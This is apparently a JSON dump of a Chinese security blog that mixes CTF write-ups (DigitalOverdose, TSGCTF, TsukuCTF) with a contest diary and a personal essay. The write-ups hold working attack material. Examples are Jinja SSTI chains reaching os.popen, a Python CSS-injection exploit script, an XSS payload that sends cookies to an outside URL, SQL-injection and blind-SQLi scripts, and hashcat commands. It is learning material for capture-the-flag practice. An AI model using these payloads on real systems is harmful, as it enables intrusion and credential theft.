/?attrid[]=\u0026amp;attrvalue[]=\u0026#34;);phpinfo();// 参考：CG-CTF 变量覆盖(PHP extract函数利用) | CTF-PHP黑魔法\nMisc/WELCOME DASCTFxJlenu 欢迎来到魔法的世界（签到）\n可是有几层包浆的原题了属于是，之前绝对做过一次\n","date":"2021-10-24T16:47:40+08:00","permalink":"https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/","section":"posts","tags":["wp"],"title":"DasCTF1021 Wp"},{"categories":["CTF"],"contents":"Web/git commit -m \u0026ldquo;whatever\u0026rdquo; Visit the website\nemmmm 联系这个题目 访问一下.git看看有没有备份文件泄露\n用GitHacker下载泄露的git文件，有一个index.php\n\u0026lt;?php /** * Simple sodium crypto class for PHP \u0026gt;= 7.2 * @author MRK */ class crypto { /** * * @return type */ static public function create_encryption_key() { return base64_encode(sodium_crypto_secretbox_keygen()); } /** * Encrypt a message * * @param string $message - message to encrypt * @param string $key - encryption key created using create_encryption_key() * @return string */ static function encrypt($message, $key) { $key_decoded = base64_decode($key); $nonce = random_bytes( SODIUM_CRYPTO_SECRETBOX_NONCEBYTES ); $cipher = base64_encode( $nonce . sodium_crypto_secretbox( $message, $nonce, $key_decoded ) ); sodium_memzero($message); sodium_memzero($key_decoded); return $cipher; } /** * Decrypt a message * @param string $encrypted - message encrypted with safeEncrypt() * @param string $key - key used for encryption * @return string */ static function decrypt($encrypted, $key) { $decoded = base64_decode($encrypted); $key_decoded = base64_decode($key); if ($decoded === false) { throw new Exception(\u0026#39;Decryption error : the encoding failed\u0026#39;); } if (mb_strlen($decoded, \u0026#39;8bit\u0026#39;) \u0026lt; (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) { throw new Exception(\u0026#39;Decryption error : the message was truncated\u0026#39;); } $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, \u0026#39;8bit\u0026#39;); $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, \u0026#39;8bit\u0026#39;); $plain = sodium_crypto_secretbox_open( $ciphertext, $nonce, $key_decoded ); if ($plain === false) { throw new Exception(\u0026#39;Decryption error : the message was tampered with in transit\u0026#39;); } sodium_memzero($ciphertext); sodium_memzero($key_decoded); return $plain; } } $privatekey = \u0026#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=\u0026#34;; $flag = file_get_contents(\u0026#39;../flag.txt\u0026#39;); $enc = crypto::encrypt($flag, $privatekey); echo $enc; ?\u0026gt; 包含了解密的模块，所以用它解密一下即可\n————这里我的本地php一直出问题 版本7.3.4和7.4.21都报错\nWeb/notrequired Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?\n注意到链接是http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html\n用伪协议看一下index.php的源码/index.php?file=php://filter/convert.base64-encode/resource=index.php\n访问/bin/secrets.txt，得到 QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==\nBUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}\nWeb/madlib I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!\nTry it out and let me know what you think! The character length limit should make this app pretty secure.\n一个flask的webapp\n先看下源码\nfrom flask import Flask, render_template_string, request, send_from_directory app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return send_from_directory(\u0026#39;html\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/madlib\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def madlib(): if len(request.json) == 5: verb = request.json.get(\u0026#39;verb\u0026#39;) noun = request.json.get(\u0026#39;noun\u0026#39;) adjective = request.json.get(\u0026#39;adjective\u0026#39;) person = request.json.get(\u0026#39;person\u0026#39;) place = request.json.get(\u0026#39;place\u0026#39;) params = [verb, noun, adjective, person, place] if any(len(i) \u0026gt; 21 for i in params): return \u0026#39;your words must not be longer than 21 characters!\u0026#39;, 403 madlib = f\u0026#39;To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\\\u0026#39;t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.\u0026#39; return render_template_string(madlib) return \u0026#39;This madlib only takes five words\u0026#39;, 403 @app.route(\u0026#39;/source\u0026#39;) def show_source(): return send_from_directory(\u0026#39;/app/\u0026#39;, \u0026#39;app.py\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, port=1337) 看到了熟悉的模板渲染（语段来自于u/masterhacker_bot），只会渲染特定的位置，而且有个特殊的{adjective}.{person}\n存在5个可以ssti的地方，但是限制每一个框字符数必须在21个之内；其中还有两个非常特殊的{adjective}.{person}连了起来，我们可以用这个.点号连接我们payload的长度\n这样相当于有4个可以构造的地方，前两个用来将长长的payload用短的变量及逆行替换，第三个是payload本体，第三和第四个位置均是回显位；首先通过config.update方法不断地向后取值来拿到可以用的函数并将其存储在config.a中，之后调用它来rce\n{%set x=config%} {%set y=x.update%} {{y(a=x __class__.__init__)}} {{config.a}} 回显\u0026lt;function Config.__init__ at 0x7fd75dae31e0\u0026gt;，现在我们设法调用函数来执行命令\n{{y(a=x.a __globals__[\u0026#39;os\u0026#39;])}} 回显\u0026lt;module 'os' from '/usr/local/lib/python3.6/os.py'\u0026gt;\n{{y(a=x.a popen)}} 回显\u0026lt;function popen at 0x7fd75ed5a730\u0026gt;，此时我们的config.a就是os.popen()，现在来调用它来执行命令\n{%set x=config%} {%set y=x.a%} {{y(\u0026#39;uname -a\u0026#39;) read()}} {{config.a}} 回显Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux，成功执行了命令，接下来就很简单了，读一波flag\n{{y(\u0026#39;cat flag.txt\u0026#39;) read()}} DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}\n————很幸运的是最后我们的payload正好小于21个字符，显然我们被长度限制了发挥，但是这里还有别的trick\nJinja不仅支持模板内部的变量赋值还支持~进行字符串的连接，再利用上config.command甚至能读出/etc/passwd\n{%set x=config%} {%set y=x.update%} {%set p=\u0026#39;cat /etc\u0026#39;%} {%set q=p~\u0026#39;/passw\u0026#39;%} {{y(b=q~\u0026#39;d\u0026#39;)}} {%set x=config%} {%set y=x.a%} {%set z=config.b%} {{z}} {{y(z).read()}} 参考：Digital Overdose 2021 Autumn CTF Writeup — madlib (web)\nLog Analysis/Part1 - Ingress Our website was hacked recently and the attackers completely ransomwared our server!\nWe\u0026rsquo;ve recovered it now, but we don\u0026rsquo;t want it to happen again.\nHere are the logs from before the attack, can you find out what happened?\n给出了访问日志，有庞大的数据，n行~~，但是不太会看~~\n在37557行出现了访问/ywesusnz cmd%3Dcd+..，往后还有一些ywesusnz开头的，37629行出现了/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==，b64解密\nDO{better_remove_that_backdoor}\nLog Analysis/Part 2 - Investigation Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don\u0026rsquo;t understand how the attacker found it so quickly.\nWe suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?\nPlease submit the attackers IP as the flag as follow, DO{x.x.x.x}\n仍然是给出了很多行的日志\n发现了可疑的内容DO{45.85.1.176} 但是提交flag错误\n（然后发现是很傻逼的把200.13.84.124当作flag交了……\nLog Analysis/Part 3 - Backup Policy So it looks like the attacker scanned our site for old backups right? Did he get one?\n接着找，发现了/backup.zip的请求是200ok\n但是交flag的时候不知道交啥，看了wp才发现藏在了UA头里\nMozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 将中间那一串b64解密后得到\nDO{s3cr3t___agent}\nSource Analysis/A1 - C-nanigans Find the flag parts in the source code, assemble the flag, submit the flag.\n(This code may not compile, and it is useless to attempt to do so)\n提示我们关注源码而不是编译\n444f7b 733075526333 5f406e616c79333173 7d hex解密后得到DO{s0uRc3_@naly31s}\nHash Cracking/Hash 1 54a09c22fc0d1af44865e411ff6e8d50 phantomlover\nHash Cracking/Hash 2 52ed4b109a2662fdf15edfd95632667869fc5802 fishchips\nHash Cracking/Hash 3 550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81 mommadobbins\nHash Cracking/Hash 4 451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723 Hash Identifier\nhashcat -m 6900 ghost\nhappyfamily\nHash Cracking/Hash 5 $2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6 hashcat -m 3200 bcrypt\ncowabunga\nHash Cracking/Hash 6 $1$veryrand$QetWu27IoJ2FFSG30xKAQ. Hash Analyzer\nhashcat -m 500 MD5-Crypt\nscottiebanks\nHash Cracking/Hash 7 $6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1 hashcat -m 1800 sha512crypt $6$\nigetmoney\n很水的wp，或者说是复现，没有什么参考价值；挺有意思的题，学到了ssti的新trick；Source Analysis的剩下两个题全是web+reverse/crypto/pwn（指路wp: Boris | I think this could be C4），谢谢，完全看不懂，已经跪了\nweb狗死路一条死路一条死路一条死路一条死路一条\n😅\n","date":"2021-10-22T11:54:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/","section":"posts","tags":["wp"],"title":"DigitalOverdoseCTF2021 Wp"},{"categories":[],"contents":"比赛前一天/15号 下午2点50的飞机，结果临出学校前发现身份证丢了，贼尴尬，找了两圈没找到就直接去机场了，用临时身份证明上了飞机之后收到电话说身份证被捡到了orz 这么低级的错误下次绝不会有了TAT\n到郑州之后打滴滴结果司机电话打不通，又正好下雨，跟队友一起上了个打表飞快的小黑车，到地铁站门口就148块钱，还好最后只给了100，但是也太他妈的坑了\n之后挤人贼多的地铁，先去酒店附近的派出所开了个证明，然后到酒店住下，饭还行，是1层自助餐，我跟另一个小姐姐住一个房间\n比赛第一天/16号 早上起来之后跟同队的两个师傅去科技馆签到，领衣服和参赛证（那边的志愿者是郑州中学的小姐姐们，颜值超高\n然后彩排了一下选手发言，回去吃中饭（默默吐槽一下某几位师傅去参观科技馆没带我玩这件事了！！！记仇 = =。\n3点半开幕式，我默默做了个选手代表发言（表情管理大失败 所有照片都拍得贼丑）\n4点开赛，真不愧是跑男模式，把我一整年的运动量都给跑完了，成功克服了不敢坐手扶电梯的恐惧症，科技馆4层上下来回跑\n最开始给的题是要在科技馆中找到5张图片上的地方并且拍照，这是最耗体力的，跑着跑着就迷路了（后来想的话，这个环节又不给分，一开始就莽有点草率，可以直接做别的题）\n然后后面的题分散在1234层，有的题是只能做一次但是不限时，有的是限时又只能一次，根据解出的程度给卡片，把上面的成语作为flag交到平台上\n说说几个印象深刻的题吧，火焰熊熊，红色革命阅读理解题，给几张纸阅读展板上的内容然后答题，不太好找，拿了1600分，10分钟不太够用，有几个是蒙上去的\n阿尼玛格斯，刚开始我过去之后一看题目描述，好家伙，拟态，还是只能做一次，我就先走了，后面再过来做的时候发现这他妈也是个阅读理解题，草，还是本童话书，全程罚抄写\n阿拉霍洞开，匪夷所思的题，以为是打开存包柜，没想到就是戳开左下角的开始，然后点开文件夹\n还有个题是找摄像头，忘了叫啥名字了，说是有180个摄像头，前5分钟肉眼看，后5分钟能拿红外线的扫描枪，反正是尽可能往多了圈（x\n驱逐麻瓜是两个题，一个是密码，不会解，php的放到最后没时间看\n很无语的是一些项目因为场地限制还需要排队，我们排到阿拉霍洞开这个题的时候离结束就剩10分钟了，还好解的比较快\n中间我们队最高到第2名，最后截止的时候是第10，8000分，刚好挂到大屏幕上\n比完之后好多队都换了头像和签名，于是我们换了这个\n吃完饭就8点了，回去准备第二天的break\u0026amp;fix\n比赛第二天/17号 早上7点半就开始比，6点半起床，困得一批又没胃口，吃了俩蛋糕拿了个酸奶就去会场了\n匆忙连上网线，看了比赛手册，awdp模式，放了4道题，两个pwn两个web\n首先感谢一下pwn👴旺旺师傅 两个题全出了 十分nb\nweb方面，一个是php反序列化（怎么老是你） 全场0解（用到了原生类的一个特性 可以参考这个题[NepCTF 2021]梦里花来牡丹亭），一个是flask的ssti注入，一开始也是0解，但是不断的放hint都没人get到他的意思，直到最后把payload都给放出来了才开始有解，可能是想的签到难度，但是大家没签上😅\n（payload是{{lipsum['__globals__']['__builtins__']['eval']('__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;ls /\u0026quot;).read()')}} ）\n然后是fix阶段，我修了php，另一位师傅修了flask，pwn👴修了一道pwn（另一个没有过check\n防御阶段的分加的特别快，修了两个题直接就干到第一了\n（忽略时间 这是晚上回来之后截的图\n应该有很多队不会用docker的相关操作吃亏了，第一轮fix只有很少的队过了check，到第二轮fix的时候还给了docker复制文件的命令\n这一场和昨天的那场综合下来我们是8623分，第二名，拿一等奖~芜湖\n第一名是北大的一个大佬，solo全场，ttttttql\n小结 被队里两个师傅带着第一次打线下，感觉还是挺棒的 ，免费吃住 爽的一批，感觉线下有一群人打ctf是个挺赛博朋克的事情哈哈哈哈哈哈哈哈哈\n打之前其实慌的一批，毕竟自己web比较菜，害怕拉跨，害怕给大家拖后腿，不过还好最后一切顺利，拿到了一等，之前从不敢设想的\n酸菜棒棒鱼yyds!!!!!!!!\n从开始学ctf，学安全方面的知识到现在也不过半年多一点，学的还是相当粗糙的，见到的师傅们都学的时间比我长，水平都比我高很多很多\n未来的路还很长，不管怎么样，我都会坚持走下去的。\n","date":"2021-10-18T20:38:54+08:00","permalink":"https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/","section":"posts","tags":[],"title":"2021强网杯青少赛线下赛参赛记录"},{"categories":["CTF"],"contents":"https://score.ctf.tsg.ne.jp/challenges | https://ctftime.org/event/1431/tasks/\nWeb/Welcome to TSG CTF! We want to welcome you, seriously.\n抓包后发现我们输入的值是post的json中的key部分而不是value，很奇怪\n给了源码，看下app.js\n11行有个比较，要通过它，可以把body置空访问（用burp的话要改一下Content-Type，默认的application/json是不能置空的），typeof null === 'object'\n$ curl \u0026#34;http://34.84.69.72:34705/\u0026#34; -X POST {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Cannot read property \u0026#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\u0026#39; of null\u0026#34;} flag会在报错中出现！\nTSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\nWeb/Udon Ta-dah! Here comes udon!\nUdon Note，一眼xss之类的\n我们发出去的note中的尖括号会被转义为实体字符，Reset会清空cookie，连带着消失之前发布过的Note\n有Tell Admin About This Udon Note的选项\n————没什么想法 以下是平淡的复现过程\n看源码，main.go\n我们需要找到那个特殊的notes_id\n接着往下看\nhttp的相应头可以泄露一些信息，这里是入手点\n仅在Firefox中有一个Link请求头，几乎等同于HTML中的\u0026lt;link\u0026gt;标签\nLink: \u0026lt;/foo.css\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/foo.css\u0026#34;\u0026gt; 我们可以向app中的任意一页注入任意的css\n同时也有需要Bypass的地方，比如这里的CSP策略style-src 'self'\n我们可以先创建一个带有恶意css的note，再将这个note的链接放入Link请求头中\nhttp://ip:port/?k=Link\u0026amp;v=%3C%2F(\u0026lt;URL of a note with styles to inject\u0026gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22 # exp.py from flask import Flask, request import requests import urllib.parse import string TARGET_BASE = \u0026#34;http://localhost:8080\u0026#34; LEAK_LENGTH = 10 CHAR_CANDIDATES = string.ascii_letters + string.digits EXPLOIT_BASE_ADDR = \u0026#34;http://host.docker.internal:1337\u0026#34; app = Flask(__name__) s = requests.Session() def build_payload(prefix: str, candidates: \u0026#34;List[str]\u0026#34;): global EXPLOIT_BASE_ADDR assert EXPLOIT_BASE_ADDR != \u0026#34;\u0026#34;, \u0026#34;EXPLOIT_BASE_ADDR is not set\u0026#34; payload = \u0026#34;{}\u0026#34; for candidate in candidates: id_prefix_to_try = prefix + candidate matcher = \u0026#39;\u0026#39;.join(map(lambda x: \u0026#39;\\\\\u0026#39; + hex(ord(x)) [2:], \u0026#39;/notes/\u0026#39; + id_prefix_to_try)) payload += \u0026#34;a[href^=\u0026#34; + matcher + \\ \u0026#34;] { background-image: url(\u0026#34; + EXPLOIT_BASE_ADDR + \\ \u0026#34;/leak?q=\u0026#34; + urllib.parse.quote(id_prefix_to_try) + \u0026#34;); }\u0026#34; return payload def post_note(title: str, description: str) -\u0026gt; str: r = s.post(TARGET_BASE + \u0026#34;/notes\u0026#34;, data={ \u0026#34;title\u0026#34;: title, \u0026#34;description\u0026#34;: description, }, headers={ \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34; }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return r.headers[\u0026#39;Location\u0026#39;].split(\u0026#39;/notes/\u0026#39;)[-1] def report_note_as_stylesheet(id: str) -\u0026gt; None: header_value = \u0026#39;\u0026lt;/notes/{}\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34;\u0026#39;.format(id) r = s.post(TARGET_BASE + \u0026#34;/tell\u0026#34;, data={ \u0026#34;path\u0026#34;: \u0026#34;/?k=Link\u0026amp;v={}\u0026#34;.format(urllib.parse.quote(header_value)), }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return None @app.route(\u0026#34;/start\u0026#34;) def start(): p = build_payload(\u0026#34;\u0026#34;, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: started exploit with a new note: {}/notes/{}\u0026#34;.format(TARGET_BASE, exploit_id)) return \u0026#34;\u0026#34; @app.route(\u0026#34;/leak\u0026#34;) def leak(): leaked_id = request.args.get(\u0026#39;q\u0026#39;) if len(leaked_id) == LEAK_LENGTH: print(\u0026#34;[+] leaked (full ID): {}\u0026#34;.format(leaked_id)) r = s.get(TARGET_BASE + \u0026#34;/notes/\u0026#34; + leaked_id) print(r.text) else: print(\u0026#34;[info] leaked: {}{}\u0026#34;.format( leaked_id, \u0026#34;*\u0026#34; * (LEAK_LENGTH - len(leaked_id)))) p = build_payload(leaked_id, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: invoked crawler with a new note: \u0026#34; + exploit_id) return \u0026#34;\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;[info] running app ...\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=1337) 详细内容参见-\u0026gt;wp\nWeb/Beginner\u0026rsquo;s Web 2021 Made drunk, so solved drunk.\n给了源码，看下index.js，emmmmmm，创建了session.routes\n但是flag并不会在最后渲染的route中出现\n所以我们想利用GetSalt处的session.salt='flag'来转到flag的路由上来获得flag\n但是[salt]会导致重写flag，所以我们想要的session是这样的状态\nsession = { routes: { flag: ..., index: ..., ... [salt]: ..., // salt is anything different from \u0026#39;flag\u0026#39; }, salt: \u0026#39;flag\u0026#39;, } 首先用GET /?action=SetSalt\u0026amp;data=flag来让salt='flag'，session会变成这样\nsession = { route: { flag: ...,\t// this route is overwritten and not accessible index: ..., ... flag: ...,\t// here is salt }, salt: \u0026#39;flag\u0026#39;, } 我们想回复到route只有一个flag并且可达的状态，但是又不想删除掉salt: 'flag'\n关键之处在于set_salt，它想完成的任务是一起更新routes和salt的值\nset_salt: async (salt) =\u0026gt; { session.routes = await setRoutes(session, salt); session.salt = salt; return \u0026#39;ok\u0026#39;; } 第二行中，我们要await setRoutes，相当于\nset_salt: (salt) =\u0026gt; { return setRoutes(session, salt).then((result) =\u0026gt; { session.routes = result; session.salt = salt; return \u0026#39;ok\u0026#39;; }); } 这里会要到一个setRoutes的返回值result\nconst setRoutes = async (session, salt) =\u0026gt; { const index = await fs.readFile(\u0026#39;index.html\u0026#39;); session.routes = { // redacted [salt]: () =\u0026gt; salt, }; return session.routes; }; 很没必要的操作，又一遍setRoutes，纯属脱裤子放屁\n当我们设置salt = 'then'时，情况就不一样了\n{ //redacted then: () =\u0026gt; salt, } 这个特殊的then关键字一出来，就很特殊，解释器会试图把它认作是await中要调用的then的部分，但是并没有await需要它这个then执行的result来作为返回值，就卡死在这里了，这个salt无处可去\nSo，GET /?action=SetSalt\u0026amp;data=then之后session将是这样的\nsession = { routes: { flag: ..., index: ..., ... then: ..., }, salt: \u0026#39;flag\u0026#39;, } 只要GET /?action=GetSalt即可，因为\nreturn session.routes[route](data);\t// route = session.salt here (just flag) 具体操作一张动图就能说清楚\n最后，这个**的东西学名叫Thenable Object，谢谢你，javascript😅\n参考：wp\nWeb/Giita Gibson Les Paul Standard.\nSteal Cookie.\n😭😭😭又是cookie\n看源码，app.js\n11行的正则匹配了空格、字母、数字、下划线，但是多余了一个.\n会把theme放进去进行一个过滤\n然后拼接到stylesheet link中，就再没有什么过滤了\n我们可以注入到href这里，比如\n\u0026lt;!-- theme=x%20onerror%3Dalert --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=x onerror=alert\u0026gt; 要完整的注入js代码，我们需要cheat DOMPurify\nDOMPurify会先检测对象在不在DOMPurify.isSupported的范围内\n所以呢，我们把它给关咯\ndelete document.implementation.__proto__.createHTMLDocument 最后的Payload，U+00A0(NBSP)不在html的空白符中，但是在Javascript的空白符中\naxios({ method: \u0026#39;post\u0026#39;, url: `http://${host}:${port}/`, headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, data: qs.encode({ theme: \u0026#39;x onerror=delete\\xA0document.implemenation__proto__.createHTMLDocument\u0026#39;, title: \u0026#39;x\u0026#39;, body: `\u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;location.href\u0026#34;=\u0026#39;${url}?\u0026#39; + document.cookie\u0026gt;`, }), }); 完整参见-\u0026gt;wp\n就是菜 不会做 勉强看看wp 还不一定看得懂\n铁废物了😅\n","date":"2021-10-04T16:44:41+08:00","permalink":"https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/","section":"posts","tags":["wp"],"title":"TSGCTF2021 Wp"},{"categories":[],"contents":"啊已经中秋了呢，距离过18岁生日整整6个月了。过去的点点滴滴，真是历历在目。\n4到6月，不多说。从7月之后，事在推着人走，太快了，往往不等着我沉淀一下就必须面对，说实话，对我来说，是有点过载了，甚至是有点栈溢出。我从没有想过我的大二开学第一个月是这样的，技术方面差的太多，生活上又不能很好的兼顾，学校这边又有一些问题是隐患。又恢复到了孤独是常态的状态下，心境却不复从前。是，一切都可以归结为想的太多做的太少，可是并没有完全相同的人生经历可以参考，每个人的情况都是独一无二的。上周每天堵晚高峰的时候在车上总会思考一些东西，天马行空的。我选择了这个专业，我真的是这块料吗？我的能力够吗？我能绷得住吗？谁又能给我解答呢？我很害怕我是个实际学习能力很差的人，是个只会搞表面功夫的人，但我知道我又非常的要强要面子，甚至会因为害怕别人的看法而不去尝试 不去试错。\n下午雨过天晴，看云，看天，想到那句话——人生如逆旅，我亦是行人。匆匆18年走过，太多的人经过我的人生，大多并没有掀起波澜，仅有的那一个 最后也只是停留片刻便离去，或许缘分 本就终有尽时。现在高强度的学习工作之类的事情让我无暇顾及这些，在累的筋疲力尽之后就一个人回味一下苦涩，把想分享的喜悲压在心里。无聊的时候翻翻知乎微博和qq空间，刷刷搞笑段子，看到开心的事情自己对着屏幕憨憨的笑一笑，也就这样了，没有可以分享的对象，没有双份加糖去冰的快乐。可能年纪大了人就更容易感伤？明明之前早就习惯了一个人的状态，自在清净，明明很早就认识习惯了与孤独常伴，但还是会偶尔多思，希望有人能够懂我，“看到我”。可能拧巴又傲娇的性格就注定单身吧，上头以后总会词不达意，等着别人来对脑电波，也可能是我不够优秀，不够好，哈。人生漫漫，许多事情谁又能看的透彻呢？当明白过来的时候有些东西早已消失在人海，一旦错过就不在吧。\n钱难挣，一个围城到另一个围城。这几天跟父母打电话，他们都特别开心看到我现在发展的样子，我看到他们开心我也很开心。他们虽然不懂专业上的事情，但是他们了解我，总能做我最后的避风港。因为太累了不想动，两次打电话都在宿舍里躺着，几个智障室友就在那里不停地笑我，讥笑，可能这就是人上人吧。有时候看到可悲的他们，对自己也是一种深刻的内省，提醒自己不要走了弯路，不要虚度时光，不要等以后追悔莫及，提醒自己不要变成自己讨厌的人。\n晚上把打车的电子发票开了一下，就我一个人的就有248块多，还不包含队友打的。我一向是对金钱没什么概念的，独生子，想要什么都有，也就什么都不想要，钱 花就完了，没什么真实的体会。出行的钱，吃饭的钱，生活的钱，以后还必定有住宿的钱，我扪心自问，步入社会后我能自己养了自己吗？在我的计划中没有考研的选项，意味着我必须去面对这些，那一天很快就会来，我能做的到吗？我能做的好吗？我会得到别人的认可吗？ 学安全的，或者说学计算机相关专业的，谁没有一颗想成为全栈的心？最开始只是做做ctf入门，现在又渴望做红队，又想做安全研究。害怕自己什么都学，什么又都学不好。时间越长，见到的 认识到的大佬们就越多，他们大都入行早，又很有天赋，教人羡煞不已。不是对自己没信心，唔，我说不好。一直以来多少有点自命不凡的想法，但是学的越久越意识到自己的平凡与普通，只是万千渺小中的一个。心中的信念和坚守还在，希望不会被外界的任何干扰给磨平。大三的一个学长，那天给我发微信说，很嫉妒我现在的学习状态，他在经历一些事之后人已经磨平了。他最近hvv也完全是自闭的状态。我不知道说什么好，他似乎把自己完全封起来了，很不好的状态。但是看别人 总会看到自己，只能不断的提醒自己，认清形势，认清状况，再冷静一点。\n感觉说出来舒服多了，无法用言语宣泄的事情诉诸笔墨也是一种不错的选择，一边打字，一边与很多事和解，慢慢释怀。\n","date":"2021-09-21T00:54:07+08:00","permalink":"https://amiaaaz.github.io/life/092121-short-diary/","section":"life","tags":[],"title":"无题"},{"categories":["CTF"],"contents":"这两天又开始有点摆烂的迹象，于是把周末的ctf看看wp，水一水，复现一下\n另外这个ctf最痛苦的地方在于是英日夹杂，我开始懂歪果仁做中文比赛页面的时候有多痛苦了\nWeb/logonly 给出的是一个有214155行的日志文件，只有第214154行返回200ok\n显然是进行了一个字典攻击，在第214154次尝试时撞对了，我们下载一份kali里的rockyou.txt中看一下214154是个啥（有提示用到kali进行攻击）\nTsukuCTF{qwertyuiop[]\\\\}\nWeb/digits 一个fastapi站，但是要求不是很高的样子\n加号放到url中相当于半角空格\nTsukuCTF{you_are_lucky_Tsukushi}\nWeb/login 登录框，万能密码admin'or 1#\nTsukuCTF{You_4r3_SUP3R_H4CKER}\n一般这种简单的登录都是万能密码，但是也得多试一试，加个注释符啊 分号什么的\nWeb/login2 说是代码重构过了\n再用上面的万能密码登入会显示这个站的所有账号\n说明还是有sqli，尝试一下联合注入admin'or 1 union select null,null#，跟上面是一样的回显，说明有两列，然后是愉快的注入（每一次的回显在页面的末尾，注意这个是最初要找到并确认的）\nadmin\u0026#39;or 1 union select table_name,null from information_schema.columns# admin\u0026#39;or 1 union select column_name,null from information_schema.columns where table_name=\u0026#39;super_secret_table\u0026#39;# admin\u0026#39;or 1 union select secret,null from super_secret_table# TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}\nWeb/login3 依然是存在sqli，用上面的两个payload都能回显正常，但是没有明确的信息，应该是需要盲注了\nimport requests def _execAnyQuery_core(query, pos, mid): url = \u0026#34;\u0026#34; params = { \u0026#34;name\u0026#34;: \u0026#34;\u0026#39;or ascii(substring(({0}),{1},1))\u0026gt;={2};#\u0026#34;.format(query, pos, mid), \u0026#34;password\u0026#34;: \u0026#34;a\u0026#34; } page = requests.post(url, data = params) return \u0026#34;ようこそ\u0026#34; in page.text def _execAnyQuery(query, pos): low = 0 high = 256 while high - low \u0026gt; 1: mid = (high + low) // 2 if _execAnyQuery(query, pos, mid): low = mid else: high = mid return low def execAnyQuery(query): i = 1 while True: char = int(_execAnyQuery(query, i)) if char == 0: return print(chr(char), end=\u0026#34;\u0026#34;) i += 1 execAnyQuery(\u0026#34;select version()\u0026#34;) for i in range(100): execAnyQuery(\u0026#34;select distinct table_name from information_schema.columnns limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(10): execAnyQuery(\u0026#34;select distinct column_name from information_shcema.columns where table_name=\u0026#39;urtla_secret_tsukushi\u0026#39;limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(33): execAnyQuery(\u0026#34;select secret from urtla_secret_tsukushi_limit 1 offset {0}\u0026#34;.format(i)) 这是官方wp里的二分法脚本，把简单的事拆成了3个函数，倒是也好，可复用性max\nTsukuCTF{U_Are_Geni0us_T$UKUSH1}\nWeb/Journey 抓包看，有很多307重定向，还以为是跟之前那个一样要跑一下一千多次的重定向，但是这个重定向是有限度的，最后的位置是/problems/journey/goal，回显405错误\n看wp，学到了\ncurl -H \u0026#39;Referer: 